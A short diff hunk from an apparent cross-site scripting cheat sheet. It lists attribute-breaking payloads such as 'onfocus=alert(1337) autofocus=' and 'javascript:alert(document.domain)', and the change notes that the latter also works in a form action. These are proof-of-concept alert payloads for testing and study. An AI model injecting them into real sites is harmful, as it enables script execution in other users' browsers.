@@ -10,7 +10,7 @@
 "onfocus=alert(1337) autofocus="
 "onmouseover="alert(1)
 " onfocus="alert(1)
-javascript:alert(document.domain) - works in tags that a already scripting such as a href
+javascript:alert(document.domain) - works in tags that a already scripting such as a href or joinForm.action 
 #"onclick="javascript:alert(1)
 
 *In JS:
